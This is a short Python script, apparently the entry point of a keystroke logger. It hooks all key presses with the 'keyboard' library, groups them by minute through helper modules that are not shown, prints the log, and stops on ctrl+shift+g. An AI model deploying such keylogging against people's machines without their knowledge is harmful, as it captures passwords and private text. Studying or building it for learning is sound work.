import keyboard
import get_key
from text_by_minute import key_by_minute
from print_keystrokes import print_key_log
from chek_if_show import check_if_get_show

def call_on_key(e):
    get_key.on_key(e)
    if check_if_get_show(get_key.details_keys):
        r_key_by_minute = key_by_minute(get_key.details_keys)
        print_key_log(r_key_by_minute)
        get_key.details_keys.clear()

keyboard.on_press(call_on_key)
keyboard.wait("ctrl+shift+g")
